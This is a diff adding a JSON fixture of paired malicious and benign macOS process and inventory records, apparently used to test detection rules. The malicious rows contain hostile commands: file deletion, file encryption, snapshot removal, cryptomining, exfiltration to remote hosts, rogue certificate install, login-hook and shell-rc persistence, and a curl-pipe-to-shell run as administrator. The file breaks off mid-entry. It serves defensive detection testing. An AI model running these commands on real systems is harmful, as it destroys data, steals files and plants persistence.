@@ -1,0 +1,1282 @@
+[
+ {
+  "filename": "macos_process_process_discovery_grep_security.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "b5151f01-fda3-4a43-a92f-a9c7094d3e22",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "ps",
+   "Exe": "/bin/ps",
+   "CommandLine": "ps aux | grep -i falcon",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "ps",
+   "Exe": "/bin/ps",
+   "CommandLine": "ps aux | grep sshd",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_network_config_discovery.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "129e6b17-aa95-4754-93bc-5fb7b8f7ba97",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "networksetup",
+   "Exe": "/usr/sbin/networksetup",
+   "CommandLine": "networksetup -listallhardwareports",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "ifconfig",
+   "Exe": "/sbin/ifconfig",
+   "CommandLine": "ifconfig en0",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_network_connections_discovery.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "bc2f6f9b-359a-4076-831f-e46069b18647",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "lsof",
+   "Exe": "/usr/sbin/lsof",
+   "CommandLine": "lsof -i :4444",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "curl",
+   "Exe": "/usr/bin/curl",
+   "CommandLine": "curl https://example.com",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_owner_user_discovery.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "5a5f95e5-e5d1-4c1d-9ea7-61592ceefe10",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "bash",
+   "Exe": "/bin/bash",
+   "CommandLine": "whoami && id -un && groups",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "id",
+   "Exe": "/usr/bin/id",
+   "CommandLine": "id",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_service_discovery_launchctl.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "1c3bba53-bda1-4bcd-b1f0-421aed7be10f",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "launchctl",
+   "Exe": "/bin/launchctl",
+   "CommandLine": "launchctl list",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "launchctl",
+   "Exe": "/bin/launchctl",
+   "CommandLine": "launchctl load -w /Library/LaunchDaemons/foo.plist",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_permission_groups_discovery.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "47144e93-1951-47e8-be8f-f65360f7dc4c",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "dscl",
+   "Exe": "/usr/bin/dscl",
+   "CommandLine": "dscl . -read /Groups/admin GroupMembership",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "dscl",
+   "Exe": "/usr/bin/dscl",
+   "CommandLine": "dscl . -list /Users",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_software_discovery.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "991f5dbd-002a-4f1d-b2e7-361f84925653",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "system_profiler",
+   "Exe": "/usr/sbin/system_profiler",
+   "CommandLine": "system_profiler SPApplicationsDataType",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "system_profiler",
+   "Exe": "/usr/sbin/system_profiler",
+   "CommandLine": "system_profiler SPHardwareDataType",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_password_policy_discovery.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "aebdda9d-0fbd-40e4-8d36-0605a7fb7853",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "pwpolicy",
+   "Exe": "/usr/bin/pwpolicy",
+   "CommandLine": "pwpolicy getaccountpolicies",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "pwpolicy",
+   "Exe": "/usr/bin/pwpolicy",
+   "CommandLine": "pwpolicy setaccountpolicies foo",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_browser_information_discovery.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "4ac6c70a-30e0-462c-a47e-38000023abc9",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "sqlite3",
+   "Exe": "/usr/bin/sqlite3",
+   "CommandLine": "sqlite3 ~/Library/Safari/History.db 'select url from history_visits'",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "Safari",
+   "Exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+   "CommandLine": "/Applications/Safari.app/Contents/MacOS/Safari",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_osascript_javascript.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "b2d84669-9067-4c5b-b90d-ed94076b6d64",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "osascript",
+   "Exe": "/usr/bin/osascript",
+   "CommandLine": "osascript -l JavaScript -e 'ObjC.import(\"Foundation\")'",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "osascript",
+   "Exe": "/usr/bin/osascript",
+   "CommandLine": "osascript -e 'display dialog \"hi\"'",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_data_destruction.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "e18fd77e-736f-4404-8db3-9fd2e31f4fb1",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "rm",
+   "Exe": "/bin/rm",
+   "CommandLine": "rm -rf /Users/analyst/Documents",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "rm",
+   "Exe": "/bin/rm",
+   "CommandLine": "rm -rf ./build/node_modules",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_data_encrypted_impact.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "c9315932-3b05-485a-bddd-2b9fba37e9c9",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "sh",
+   "Exe": "/bin/sh",
+   "CommandLine": "find /Users/analyst/Documents -type f -exec openssl enc -aes-256-cbc -out {}.enc {} ;",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "openssl",
+   "Exe": "/usr/bin/openssl",
+   "CommandLine": "openssl enc -aes-256-cbc -in config.yml -out config.enc",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_inhibit_recovery.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "6a37f68a-7b19-4808-b71e-31d5b9044f72",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "tmutil",
+   "Exe": "/usr/bin/tmutil",
+   "CommandLine": "tmutil deletelocalsnapshots /",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "tmutil",
+   "Exe": "/usr/bin/tmutil",
+   "CommandLine": "tmutil listlocalsnapshots /",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_cryptomining.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "8131dd10-2246-48ab-b453-c06b74c1a146",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "xmrig",
+   "Exe": "/private/tmp/.x/xmrig",
+   "CommandLine": "/tmp/.x/xmrig --donate-level 1 -o stratum+tcp://pool.minexmr.com:4444 --coin monero",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": false,
+    "Trusted": false,
+    "SubjectName": null
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "node",
+   "Exe": "/usr/local/bin/node",
+   "CommandLine": "node server.js --port 3000",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_service_stop.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "c55c4b77-e4cd-4213-baf0-9ffb87c2790f",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "launchctl",
+   "Exe": "/bin/launchctl",
+   "CommandLine": "launchctl bootout system/com.apple.auditd",
+   "Username": "root",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "launchctl",
+   "Exe": "/bin/launchctl",
+   "CommandLine": "launchctl bootout gui/501/com.foobar.app",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_system_shutdown.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "720cc969-cb37-48c0-a485-dc2d1074eef4",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "shutdown",
+   "Exe": "/sbin/shutdown",
+   "CommandLine": "shutdown -h now",
+   "Username": "root",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "softwareupdate",
+   "Exe": "/usr/sbin/softwareupdate",
+   "CommandLine": "softwareupdate --list",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_cloud_storage_exfil.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "4319b722-f6fe-4fda-abb9-81c402327d5e",
+  "malicious_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "rclone sync /Users/analyst/Documents remote:exfil-bucket",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "brew install rclone",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_altproto_exfil.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "57b16e3a-77ca-4f6d-9a45-08cf3250b2c3",
+  "malicious_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "curl -T ftp://198.51.100.9/loot.zip -u a:b",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "curl -O https://example.com/file.zip",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_removable_media_exfil.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "50cd5173-c91b-4286-af17-018809c64c2d",
+  "malicious_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "rsync -a /Users/analyst/Documents/ /Volumes/USBSTICK/loot/",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "rsync -avz /Users/analyst/proj/ /Users/analyst/cache/",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_smb_admin_share.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "664b6d89-801e-4088-ba0f-8ab6777e1c3d",
+  "malicious_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "mount_smbfs //user@10.0.0.5/C$ /Volumes/share",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "smbd --daemon",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_enable_remote_desktop.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "9f86c124-846b-488d-a2e3-835aff7032fe",
+  "malicious_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "kickstart -activate -configure -allowAccessFor -allUsers",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "systemsetup -getremotelogin",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_lateral_tool_transfer.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "c5e8e8d1-7c7b-4e7f-ba63-ed56346bca57",
+  "malicious_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "rsync -e ssh -avz /tmp/implant.bin user@10.0.0.7:/tmp/",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "ssh user@buildhost uptime",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_inventory_remote_access_software.yml",
+  "dataset": "macos.inventory",
+  "normalizer": "inventory",
+  "rule_id": "02667937-810e-4a9d-8447-d7bdb6619e91",
+  "malicious_row": {
+   "Name": "AnyDesk",
+   "BundleIdentifier": "com.philandro.anydesk",
+   "Version": "7.0",
+   "Path": "/Applications/AnyDesk.app",
+   "SignerCN": "Developer ID Application: philandro",
+   "Mtime": "2026-07-01T00:00:00Z"
+  },
+  "benign_row": {
+   "Name": "Slack",
+   "BundleIdentifier": "com.tinyspeck.slackmacgap",
+   "Version": "4.36.140",
+   "Path": "/Applications/Slack.app",
+   "SignerCN": "Developer ID Application: Slack Technologies, Inc.",
+   "Mtime": "2026-07-01T00:00:00Z"
+  }
+ },
+ {
+  "filename": "macos_process_protocol_tunneling.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "65fba30e-0917-4e61-97ae-204488cc6d59",
+  "malicious_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "ssh -D 1080 -nNT user@45.9.148.99",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "ssh user@host uptime",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_dns_tunneling_tool.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "30af3c8f-4812-473b-b47f-f70843af4ba3",
+  "malicious_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "iodine -f -P s3cr3t 8.8.8.8 tunnel.evil.com",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 501,
+   "Ppid": 500,
+   "Name": "proc",
+   "Exe": "/bin/proc",
+   "CommandLine": "nslookup example.com",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_rogue_root_ca.yml",
+  "rule_id": "cd6cece9-86ea-4632-b556-5ab95f01f87d",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "security",
+   "Exe": "/usr/bin/security",
+   "CommandLine": "security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/evil.cer",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "security",
+   "Exe": "/usr/bin/security",
+   "CommandLine": "security find-certificate -a -Z",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "dataset": "macos.process",
+  "normalizer": "processes"
+ },
+ {
+  "filename": "macos_process_secure_file_deletion.yml",
+  "rule_id": "d99904af-ac9e-467b-8b91-9f8f443aef61",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "srm",
+   "Exe": "/usr/bin/srm",
+   "CommandLine": "srm -rf /Users/analyst/Documents/notes.txt",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "rm",
+   "Exe": "/bin/rm",
+   "CommandLine": "rm -rf /tmp/build/cache",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "dataset": "macos.process",
+  "normalizer": "processes"
+ },
+ {
+  "filename": "macos_process_screensaver_password_disable.yml",
+  "rule_id": "b67332a2-8821-4486-b303-d16befe58ea6",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "defaults",
+   "Exe": "/usr/bin/defaults",
+   "CommandLine": "defaults write com.apple.screensaver askForPassword -int 0",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "defaults",
+   "Exe": "/usr/bin/defaults",
+   "CommandLine": "defaults write com.apple.screensaver askForPassword -int 1",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "dataset": "macos.process",
+  "normalizer": "processes"
+ },
+ {
+  "filename": "macos_process_loginwindow_hook.yml",
+  "rule_id": "824a09ae-c825-45a8-9d39-12a693e23e4f",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "defaults",
+   "Exe": "/usr/bin/defaults",
+   "CommandLine": "defaults write com.apple.loginwindow LoginHook /tmp/evil.sh",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "defaults",
+   "Exe": "/usr/bin/defaults",
+   "CommandLine": "defaults read com.apple.loginwindow",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "dataset": "macos.process",
+  "normalizer": "processes"
+ },
+ {
+  "filename": "macos_process_shell_rc_persistence.yml",
+  "rule_id": "3d679a52-2f5e-46f5-a59e-9189d8130338",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "bash",
+   "Exe": "/bin/bash",
+   "CommandLine": "bash -c \"echo 'sh /tmp/.x' >> ~/.zshrc\"",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "bash",
+   "Exe": "/bin/bash",
+   "CommandLine": "bash -c \"echo 'eval \\\"$(/opt/homebrew/bin/brew shellenv)\\\"' >> /Users/analyst/.zprofile\"",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "dataset": "macos.process",
+  "normalizer": "processes"
+ },
+ {
+  "filename": "macos_process_launch_plist_modify.yml",
+  "rule_id": "341a0639-fd63-40d1-b5fd-d51a4efd2b11",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "plutil",
+   "Exe": "/usr/bin/plutil",
+   "CommandLine": "plutil -replace ProgramArguments -json '[\"/tmp/evil\"]' /Users/analyst/Library/LaunchAgents/com.evil.plist",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "plutil",
+   "Exe": "/usr/bin/plutil",
+   "CommandLine": "plutil -lint /Users/analyst/Library/LaunchAgents/com.example.plist",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "dataset": "macos.process",
+  "normalizer": "processes"
+ },
+ {
+  "filename": "macos_process_elevated_prompt_exec.yml",
+  "rule_id": "9c6ff890-e893-4e74-bd9e-719e398d1a58",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "osascript",
+   "Exe": "/usr/bin/osascript",
+   "CommandLine": "osascript -e 'do shell script \"curl http://x|sh\" with administrator privileges'",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
